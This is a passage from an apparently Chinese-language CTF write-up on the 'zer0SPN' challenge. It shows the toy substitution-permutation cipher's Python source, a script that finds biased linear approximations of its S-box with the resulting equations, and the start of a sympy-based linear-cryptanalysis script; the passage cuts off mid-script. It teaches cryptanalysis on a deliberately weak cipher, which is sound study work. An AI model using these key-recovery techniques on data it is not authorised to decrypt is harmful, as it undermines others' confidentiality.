<span class="number">45</span>, <span class="number">104</span>, <span class="number">189</span>, <span class="number">173</span>, <span class="number">185</span>, <span class="number">86</span>, <span class="number">29</span>, <span class="number">170</span>, <span class="number">71</span>, <span class="number">229</span>, <span class="number">40</span>, <span class="number">159</span>, <span class="number">84</span>, <span class="number">245</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">14</span>, <span class="number">114</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">s2b</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">return</span> map(int, format(int(str(s).encode(<span class="string">'hex'</span>), <span class="number">16</span>), <span class="string">'0&#123;&#125;b'</span>.format(<span class="number">8</span>*len(s))))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2s</span><span class="params">(b)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray.fromhex(format(reduce(<span class="keyword">lambda</span> x,y: <span class="number">2</span>*x+y, b), <span class="string">'0&#123;&#125;x'</span>.format(len(b)/<span class="number">4</span>)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addkey</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">global</span> flag</div><div class="line">    <span class="keyword">return</span> bytearray(i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a, b))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">assert</span> len(a) == <span class="number">8</span></div><div class="line">    bits = s2b(a)</div><div class="line">    bits = [bits[ptable[i]] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">64</span>)]</div><div class="line">    <span class="keyword">return</span> b2s(bits)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute_inv</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox_inv[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">zer0SPN</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="string">'''0ops Substitution–Permutation Network'''</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, key, key_size=<span class="number">8</span>, rounds=<span class="number">4</span>)</span>:</span></div><div class="line">        <span class="keyword">assert</span> len(key) == key_size</div><div class="line">        self.key = key</div><div class="line">        self.key_size = key_size</div><div class="line">        self.rounds = rounds</div><div class="line">        self.key_schedule()</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">key_schedule</span><span class="params">(self)</span>:</span></div><div class="line">        roundkey = bytearray(self.key)</div><div class="line">        tmp = roundkey[<span class="number">-4</span>:]</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, self.rounds+<span class="number">1</span>):</div><div class="line">            tmp = tmp[<span class="number">1</span>:] + tmp[:<span class="number">1</span>]</div><div class="line">            tmp = bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp)</div><div class="line">            tmp[<span class="number">0</span>] ^= rcon[i]</div><div class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> range(self.key_size/<span class="number">4</span>):</div><div class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">                    tmp[k] ^= roundkey[-self.key_size+k]</div><div class="line">                roundkey += tmp</div><div class="line">        self.roundkey = roundkey</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_roundkey</span><span class="params">(self, k)</span>:</span></div><div class="line">        <span class="keyword">assert</span> k &lt;= self.rounds</div><div class="line">        <span class="keyword">return</span> self.roundkey[self.key_size*k:self.key_size*(k+<span class="number">1</span>)]</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(self, plain)</span>:</span></div><div class="line">        <span class="keyword">assert</span> len(plain) == self.key_size</div><div class="line">        block = bytearray(plain)</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(self.rounds):</div><div class="line">            block = addkey(block, self.get_roundkey(i))</div><div class="line">            block = substitute(block)</div><div class="line">            <span class="keyword">if</span> i != self.rounds - <span class="number">1</span>:</div><div class="line">                <span class="comment"># Permutation in the last round is of no purpose.</span></div><div class="line">                block = permutation(block)</div><div class="line">        block = addkey(block, self.get_roundkey(i+<span class="number">1</span>))</div><div class="line">        <span class="keyword">return</span> block</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_schedule</span><span class="params">(key)</span>:</span></div><div class="line">    rounds = <span class="number">4</span></div><div class="line">    key_size = <span class="number">8</span></div><div class="line">    roundkey = bytearray(key)</div><div class="line">    tmp = roundkey[<span class="number">-4</span>:]</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, rounds+<span class="number">1</span>):</div><div class="line">        tmp = tmp[<span class="number">1</span>:] + tmp[:<span class="number">1</span>]</div><div class="line">        tmp = bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp)</div><div class="line">        tmp[<span class="number">0</span>] ^= rcon[i]</div><div class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(key_size/<span class="number">4</span>):</div><div class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">4</span>):</div><div class="line">                tmp[k] ^= roundkey[-key_size+k]</div><div class="line">            roundkey += tmp</div><div class="line">    roundkey = roundkey</div><div class="line">    <span class="keyword">return</span> roundkey</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">key_schedule_inv</span><span class="params">(last_key)</span>:</span></div><div class="line">    rounds = <span class="number">4</span></div><div class="line">    key_size = <span class="number">8</span></div><div class="line">    roundkey = bytearray(last_key)</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(rounds, <span class="number">0</span>, <span class="number">-1</span>):</div><div class="line">        tmp = roundkey[<span class="number">4</span>:<span class="number">8</span>]</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">            tmp[k] ^= roundkey[k]</div><div class="line">        roundkey = tmp+roundkey</div><div class="line">        tmp = roundkey[<span class="number">0</span>:<span class="number">4</span>]</div><div class="line">        tmp = tmp[<span class="number">1</span>:] + tmp[:<span class="number">1</span>]</div><div class="line">        tmp = bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp)</div><div class="line">        tmp[<span class="number">0</span>] ^= rcon[i]</div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">4</span>):</div><div class="line">            tmp[k] ^= roundkey[<span class="number">4</span>+k]</div><div class="line">        roundkey = tmp + roundkey</div><div class="line">    roundkey = roundkey</div><div class="line">    <span class="keyword">return</span> roundkey</div><div class="line"></div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</div><div class="line">    <span class="keyword">print</span> sbox[i]^sbox[i+<span class="number">1</span>]</div><div class="line">exit(<span class="number">0</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">from</span> os <span class="keyword">import</span> urandom</div><div class="line">    <span class="keyword">from</span> struct <span class="keyword">import</span> pack</div><div class="line">    <span class="keyword">import</span> binascii</div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">"Your flag is flag&#123;%s&#125;"</span> % secret.encode(<span class="string">'hex'</span>)</div><div class="line">    f = open(<span class="string">'data'</span>, <span class="string">'wb'</span>)</div><div class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">65536</span>):</div><div class="line">        c = zer0SPN(secret)</div><div class="line">        plaintext = bytearray(urandom(<span class="number">8</span>))</div><div class="line">        f.write(pack(<span class="string">'8B'</span>, *plaintext))</div><div class="line">        ciphertext = c.encrypt(plaintext)</div><div class="line">        f.write(pack(<span class="string">'8B'</span>, *ciphertext))</div><div class="line">    f.close()</div></pre></td></tr></table></figure>
<p>使用下面脚本获取S盒的缺陷表达式：(find_linear_approxmation)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> insum <span class="keyword">in</span> xrange(<span class="number">256</span>):</div><div class="line">    <span class="keyword">for</span> outsum <span class="keyword">in</span> xrange(<span class="number">256</span>):</div><div class="line">        <span class="keyword">if</span> insum&amp;(insum<span class="number">-1</span>) <span class="keyword">and</span> outsum&amp;(outsum<span class="number">-1</span>):</div><div class="line">            <span class="keyword">continue</span></div><div class="line">        bias = sum((bin(x&amp;insum).count(<span class="string">'1'</span>) + bin(sbox[x]&amp;outsum).count(<span class="string">'1'</span>)) % <span class="number">2</span> <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">256</span>)) - <span class="number">128</span></div><div class="line">        <span class="keyword">if</span> abs(bias) &gt; <span class="number">40</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'+'</span>.join([<span class="string">'X'</span>+str(i) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>) <span class="keyword">if</span> insum&amp;(<span class="number">2</span>**i)] + [<span class="string">'Y'</span>+str(i) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>) <span class="keyword">if</span> outsum&amp;(<span class="number">2</span>**i)])</div></pre></td></tr></table></figure>
<p>得到:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">X0+Y0+Y1+Y2+Y7</div><div class="line">X1+Y0+Y1+Y3+Y4+Y7</div><div class="line">X2+Y0+Y1+Y2+Y3+Y4+Y6+Y7</div><div class="line">X3+Y1+Y4+Y5+Y7</div><div class="line">X4+Y0+Y2+Y4+Y5+Y6</div><div class="line">X0+X3+X4+Y6</div><div class="line">X0+X1+X2+X3+X4+Y2</div><div class="line">X5+Y0+Y1+Y2+Y3+Y4</div><div class="line">X0+X2+X3+X4+X5+Y7</div><div class="line">X6+Y1+Y7</div><div class="line">X1+X2+X3+X4+X6+Y0</div><div class="line">X0+X2+X3+X4+X5+X6+Y1</div><div class="line">X7+Y0+Y4</div><div class="line">X1+X2+X4+X7+Y5</div><div class="line">X1+X6+X7+Y3</div><div class="line">X1+X2+X3+X4+X6+X7+Y4</div></pre></td></tr></table></figure>
<p>然后我们来获得到第四轮时的表达式（未亦或）：(这里选择性地用了几组开始数据)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sympy</div><div class="line">rcon = [<span class="number">0x8d</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1b</span>, <span class="number">0x36</span>, <span class="number">0x6c</span>, <span class="number">0xd8</span>, <span class="number">0xab</span>, <span class="number">0x4d</span>, <span class="number">0x9a</span>]</div><div class="line">sbox = [<span class="number">62</span>, <span class="number">117</span>, <span class="number">195</span>, <span class="number">179</span>, <span class="number">20</span>, <span class="number">210</span>, <span class="number">41</span>, <span class="number">66</span>, <span class="number">116</span>, <span class="number">178</span>, <span class="number">152</span>, <span class="number">143</span>, <span class="number">75</span>, <span class="number">105</span>, <span class="number">254</span>, <span class="number">1</span>, <span class="number">158</span>, <span class="number">95</span>, <span class="number">101</span>, <span class="number">175</span>, <span class="number">191</span>, <span class="number">166</span>, <span class="number">36</span>, <span class="number">24</span>, <span class="number">50</span>, <span class="number">39</span>, <span class="number">190</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">242</span>, <span class="number">182</span>, <span class="number">185</span>, <span class="number">61</span>, <span class="number">225</span>, <span class="number">140</span>, <span class="number">38</span>, <span class="number">150</span>, <span class="number">80</span>, <span class="number">19</span>, <span class="number">109</span>, <span class="number">246</span>, <span class="number">252</span>, <span class="number">40</span>, <span class="number">13</span>, <span class="number">65</span>, <span class="number">236</span>, <span class="number">124</span>, <span class="number">186</span>, <span class="number">214</span>, <span class="number">86</span>, <span class="number">235</span>, <span class="number">100</span>, <span class="number">97</span>, <span class="number">49</span>, <span class="number">197</span>, <span class="number">154</span>, <span class="number">176</span>, <span class="number">199</span>, <span class="number">253</span>, <span class="number">69</span>, <span class="number">88</span>, <span class="number">112</span>, <span class="number">139</span>, <span class="number">77</span>, <span class="number">184</span>, <span class="number">45</span>, <span class="number">133</span>, <span class="number">104</span>, <span class="number">15</span>, <span class="number">54</span>, <span class="number">177</span>, <span class="number">244</span>, <span class="number">160</span>, <span class="number">169</span>, <span class="number">82</span>, <span class="number">148</span>, <span class="number">73</span>, <span class="number">30</span>, <span class="number">229</span>, <span class="number">35</span>, <span class="number">79</span>, <span class="number">137</span>, <span class="number">157</span>, <span class="number">180</span>, <span class="number">248</span>, <span class="number">163</span>, <span class="number">241</span>, <span class="number">231</span>, <span class="number">81</span>, <span class="number">94</span>, <span class="number">165</span>, <span class="number">9</span>, <span class="number">162</span>, <span class="number">233</span>, <span class="number">18</span>, <span class="number">85</span>, <span class="number">217</span>, <span class="number">84</span>, <span class="number">7</span>, <span class="number">55</span>, <span class="number">63</span>, <span class="number">171</span>, <span class="number">56</span>, <span class="number">118</span>, <span class="number">237</span>, <span class="number">132</span>, <span class="number">136</span>, <span class="number">22</span>, <span class="number">90</span>, <span class="number">221</span>, <span class="number">103</span>, <span class="number">161</span>, <span class="number">205</span>, <span class="number">11</span>, <span class="number">255</span>, <span class="number">14</span>, <span class="number">122</span>, <span class="number">47</span>, <span class="number">71</span>, <span class="number">201</span>, <span class="number">99</span>, <span class="number">220</span>, <span class="number">83</span>, <span class="number">74</span>, <span class="number">173</span>, <span class="number">76</span>, <span class="number">144</span>, <span class="number">16</span>, <span class="number">155</span>, <span class="number">126</span>, <span class="number">60</span>, <span class="number">96</span>, <span class="number">44</span>, <span class="number">234</span>, <span class="number">17</span>, <span class="number">215</span>, <span class="number">107</span>, <span class="number">138</span>, <span class="number">159</span>, <span class="number">183</span>, <span class="number">251</span>, <span class="number">3</span>, <span class="number">198</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">170</span>, <span class="number">131</span>, <span class="number">151</span>, <span class="number">219</span>, <span class="number">29</span>, <span class="number">230</span>, <span class="number">32</span>, <span class="number">187</span>, <span class="number">125</span>, <span class="number">134</span>, <span class="number">64</span>, <span class="number">12</span>, <span class="number">202</span>, <span class="number">164</span>, <span class="number">247</span>, <span class="number">25</span>, <span class="number">223</span>, <span class="number">222</span>, <span class="number">119</span>, <span class="number">174</span>, <span class="number">67</span>, <span class="number">147</span>, <span class="number">146</span>, <span class="number">206</span>, <span class="number">51</span>, <span class="number">243</span>, <span class="number">53</span>, <span class="number">121</span>, <span class="number">239</span>, <span class="number">68</span>, <span class="number">130</span>, <span class="number">70</span>, <span class="number">203</span>, <span class="number">211</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">113</span>, <span class="number">8</span>, <span class="number">106</span>, <span class="number">57</span>, <span class="number">240</span>, <span class="number">21</span>, <span class="number">93</span>, <span class="number">142</span>, <span class="number">238</span>, <span class="number">167</span>, <span class="number">5</span>, <span class="number">128</span>, <span class="number">72</span>, <span class="number">189</span>, <span class="number">192</span>, <span class="number">193</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">204</span>, <span class="number">87</span>, <span class="number">145</span>, <span class="number">188</span>, <span class="number">172</span>, <span class="number">224</span>, <span class="number">226</span>, <span class="number">207</span>, <span class="number">27</span>, <span class="number">218</span>, <span class="number">48</span>, <span class="number">33</span>, <span class="number">28</span>, <span class="number">123</span>, <span class="number">6</span>, <span class="number">37</span>, <span class="number">59</span>, <span class="number">4</span>, <span class="number">102</span>, <span class="number">114</span>, <span class="number">91</span>, <span class="number">23</span>, <span class="number">209</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">2</span>, <span class="number">196</span>, <span class="number">141</span>, <span class="number">208</span>, <span class="number">181</span>, <span class="number">245</span>, <span class="number">43</span>, <span class="number">78</span>, <span class="number">213</span>, <span class="number">216</span>, <span class="number">232</span>, <span class="number">46</span>, <span class="number">98</span>, <span class="number">26</span>, <span class="number">212</span>, <span class="number">58</span>, <span class="number">115</span>, <span class="number">194</span>, <span class="number">200</span>, <span class="number">129</span>, <span class="number">227</span>, <span class="number">249</span>, <span class="number">127</span>, <span class="number">149</span>, <span class="number">135</span>, <span class="number">228</span>, <span class="number">31</span>, <span class="number">153</span>, <span class="number">250</span>, <span class="number">156</span>, <span class="number">168</span>, <span class="number">110</span>]</div><div class="line">ptable = [</div><div class="line">    <span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">24</span>, <span class="number">32</span>, <span class="number">40</span>, <span class="number">48</span>, <span class="number">56</span>,</div><div class="line">    <span class="number">1</span>, <span class="number">9</span>, <span class="number">17</span>, <span class="number">25</span>, <span class="number">33</span>, <span class="number">41</span>, <span class="number">49</span>, <span class="number">57</span>,</div><div class="line">    <span class="number">2</span>, <span class="number">10</span>, <span class="number">18</span>, <span class="number">26</span>, <span class="number">34</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">58</span>,</div><div class="line">    <span class="number">3</span>, <span class="number">11</span>, <span class="number">19</span>, <span class="number">27</span>, <span class="number">35</span>, <span class="number">43</span>, <span class="number">51</span>, <span class="number">59</span>,</div><div class="line">    <span class="number">4</span>, <span class="number">12</span>, <span class="number">20</span>, <span class="number">28</span>, <span class="number">36</span>, <span class="number">44</span>, <span class="number">52</span>, <span class="number">60</span>,</div><div class="line">    <span class="number">5</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">45</span>, <span class="number">53</span>, <span class="number">61</span>,</div><div class="line">    <span class="number">6</span>, <span class="number">14</span>, <span class="number">22</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">46</span>, <span class="number">54</span>, <span class="number">62</span>,</div><div class="line">    <span class="number">7</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">31</span>, <span class="number">39</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">63</span></div><div class="line">]</div><div class="line">sbox_inv = [<span class="number">143</span>, <span class="number">15</span>, <span class="number">224</span>, <span class="number">141</span>, <span class="number">216</span>, <span class="number">191</span>, <span class="number">213</span>, <span class="number">98</span>, <span class="number">182</span>, <span class="number">91</span>, <span class="number">198</span>, <span class="number">113</span>, <span class="number">156</span>, <span class="number">43</span>, <span class="number">115</span>, <span class="number">68</span>, <span class="number">127</span>, <span class="number">134</span>, <span class="number">94</span>, <span class="number">38</span>, <span class="number">4</span>, <span class="number">186</span>, <span class="number">107</span>, <span class="number">220</span>, <span class="number">23</span>, <span class="number">160</span>, <span class="number">237</span>, <span class="number">207</span>, <span class="number">211</span>, <span class="number">149</span>, <span class="number">77</span>, <span class="number">250</span>, <span class="number">151</span>, <span class="number">210</span>, <span class="number">222</span>, <span class="number">79</span>, <span class="number">22</span>, <span class="number">214</span>, <span class="number">35</span>, <span class="number">25</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">223</span>, <span class="number">230</span>, <span class="number">132</span>, <span class="number">65</span>, <span class="number">235</span>, <span class="number">117</span>, <span class="number">209</span>, <span class="number">53</span>, <span class="number">24</span>, <span class="number">169</span>, <span class="number">28</span>, <span class="number">171</span>, <span class="number">69</span>, <span class="number">99</span>, <span class="number">102</span>, <span class="number">184</span>, <span class="number">239</span>, <span class="number">215</span>, <span class="number">130</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">155</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">165</span>, <span class="number">174</span>, <span class="number">59</span>, <span class="number">176</span>, <span class="number">118</span>, <span class="number">193</span>, <span class="number">76</span>, <span class="number">123</span>, <span class="number">12</span>, <span class="number">125</span>, <span class="number">63</span>, <span class="number">231</span>, <span class="number">80</span>, <span class="number">37</span>, <span class="number">88</span>, <span class="number">74</span>, <span class="number">122</span>, <span class="number">97</span>, <span class="number">95</span>, <span class="number">49</span>, <span class="number">200</span>, <span class="number">60</span>, <span class="number">144</span>, <span class="number">108</span>, <span class="number">219</span>, <span class="number">197</span>, <span class="number">187</span>, <span class="number">89</span>, <span class="number">17</span>, <span class="number">131</span>, <span class="number">52</span>, <span class="number">236</span>, <span class="number">120</span>, <span class="number">51</span>, <span class="number">18</span>, <span class="number">217</span>, <span class="number">110</span>, <span class="number">67</span>, <span class="number">13</span>, <span class="number">183</span>, <span class="number">136</span>, <span class="number">180</span>, <span class="number">39</span>, <span class="number">255</span>, <span class="number">179</span>, <span class="number">61</span>, <span class="number">181</span>, <span class="number">218</span>, <span class="number">240</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">103</span>, <span class="number">163</span>, <span class="number">27</span>, <span class="number">172</span>, <span class="number">116</span>, <span class="number">212</span>, <span class="number">46</span>, <span class="number">153</span>, <span class="number">129</span>, <span class="number">246</span>, <span class="number">192</span>, <span class="number">243</span>, <span class="number">175</span>, <span class="number">146</span>, <span class="number">105</span>, <span class="number">66</span>, <span class="number">154</span>, <span class="number">248</span>, <span class="number">106</span>, <span class="number">81</span>, <span class="number">137</span>, <span class="number">62</span>, <span class="number">34</span>, <span class="number">226</span>, <span class="number">188</span>, <span class="number">11</span>, <span class="number">126</span>, <span class="number">201</span>, <span class="number">167</span>, <span class="number">166</span>, <span class="number">75</span>, <span class="number">247</span>, <span class="number">36</span>, <span class="number">147</span>, <span class="number">10</span>, <span class="number">251</span>, <span class="number">55</span>, <span class="number">128</span>, <span class="number">253</span>, <span class="number">82</span>, <span class="number">16</span>, <span class="number">138</span>, <span class="number">72</span>, <span class="number">111</span>, <span class="number">92</span>, <span class="number">85</span>, <span class="number">158</span>, <span class="number">90</span>, <span class="number">21</span>, <span class="number">190</span>, <span class="number">254</span>, <span class="number">73</span>, <span class="number">145</span>, <span class="number">101</span>, <span class="number">203</span>, <span class="number">124</span>, <span class="number">164</span>, <span class="number">19</span>, <span class="number">56</span>, <span class="number">70</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">83</span>, <span class="number">228</span>, <span class="number">30</span>, <span class="number">139</span>, <span class="number">64</span>, <span class="number">31</span>, <span class="number">47</span>, <span class="number">152</span>, <span class="number">202</span>, <span class="number">194</span>, <span class="number">26</span>, <span class="number">20</span>, <span class="number">195</span>, <span class="number">196</span>, <span class="number">241</span>, <span class="number">2</span>, <span class="number">225</span>, <span class="number">54</span>, <span class="number">142</span>, <span class="number">57</span>, <span class="number">242</span>, <span class="number">119</span>, <span class="number">157</span>, <span class="number">177</span>, <span class="number">199</span>, <span class="number">112</span>, <span class="number">168</span>, <span class="number">206</span>, <span class="number">227</span>, <span class="number">221</span>, <span class="number">5</span>, <span class="number">178</span>, <span class="number">238</span>, <span class="number">232</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">233</span>, <span class="number">96</span>, <span class="number">208</span>, <span class="number">148</span>, <span class="number">121</span>, <span class="number">109</span>, <span class="number">162</span>, <span class="number">161</span>, <span class="number">204</span>, <span class="number">33</span>, <span class="number">205</span>, <span class="number">244</span>, <span class="number">249</span>, <span class="number">78</span>, <span class="number">150</span>, <span class="number">87</span>, <span class="number">234</span>, <span class="number">93</span>, <span class="number">133</span>, <span class="number">50</span>, <span class="number">45</span>, <span class="number">104</span>, <span class="number">189</span>, <span class="number">173</span>, <span class="number">185</span>, <span class="number">86</span>, <span class="number">29</span>, <span class="number">170</span>, <span class="number">71</span>, <span class="number">229</span>, <span class="number">40</span>, <span class="number">159</span>, <span class="number">84</span>, <span class="number">245</span>, <span class="number">252</span>, <span class="number">140</span>, <span class="number">41</span>, <span class="number">58</span>, <span class="number">14</span>, <span class="number">114</span>]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">s2b</span><span class="params">(s)</span>:</span></div><div class="line">    <span class="keyword">return</span> map(int, format(int(str(s).encode(<span class="string">'hex'</span>), <span class="number">16</span>), <span class="string">'0&#123;&#125;b'</span>.format(<span class="number">8</span>*len(s))))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">b2s</span><span class="params">(b)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray.fromhex(format(reduce(<span class="keyword">lambda</span> x,y: <span class="number">2</span>*x+y, b), <span class="string">'0&#123;&#125;x'</span>.format(len(b)/<span class="number">4</span>)))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">addkey</span><span class="params">(a, b)</span>:</span></div><div class="line">    <span class="keyword">global</span> flag</div><div class="line">    <span class="keyword">return</span> bytearray(i^j <span class="keyword">for</span> i,j <span class="keyword">in</span> zip(a, b))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">permutation</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">assert</span> len(a) == <span class="number">8</span></div><div class="line">    bits = s2b(a)</div><div class="line">    bits = [bits[ptable[i]] <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">64</span>)]</div><div class="line">    <span class="keyword">return</span> b2s(bits)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">substitute_inv</span><span class="params">(a)</span>:</span></div><div class="line">    <span class="keyword">return</span> bytearray(sbox_inv[i] <span class="keyword">for</span> i <span class="keyword">in</span> a)</div><div class="line"></div><div class="line"><span class="comment"># Some precomputations of the P-box to use (byte,bit) indexing</span></div><div class="line">pt = [[<span class="keyword">None</span> <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>)]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">        c = bytearray(<span class="string">'\0'</span>*<span class="number">8</span>)</div><div class="line">        c[i] = chr(<span class="number">2</span>**j)</div><div class="line">        d = permutation(c)</div><div class="line">        i2 = <span class="keyword">None</span></div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">            <span class="keyword">if</span> d[k] != <span class="number">0</span>:</div><div class="line">                <span class="keyword">assert</span> i2 <span class="keyword">is</span> <span class="keyword">None</span></div><div class="line">                i2 = k</div><div class="line">        j2 = <span class="keyword">None</span></div><div class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> xrange(<span class="number">8</span>):</div><div class="line">            <span class="keyword">if</span> (d[i2]&amp;(<span class="number">2</span>**k)) != <span class="number">0</span>:</div><div class="line">                <span class="keyword">assert</span> j2 <span class="keyword">is</span> <span class="keyword">None</span></div><div class="line">                j2 = k</div><div class="line">        pt[i][j] = (i2,j2)</div><div class="line"></div><div class="line">K = sympy.IndexedBase(<span class="string">'K'</span>)</div><div class="line">P = sympy.IndexedBase(<span 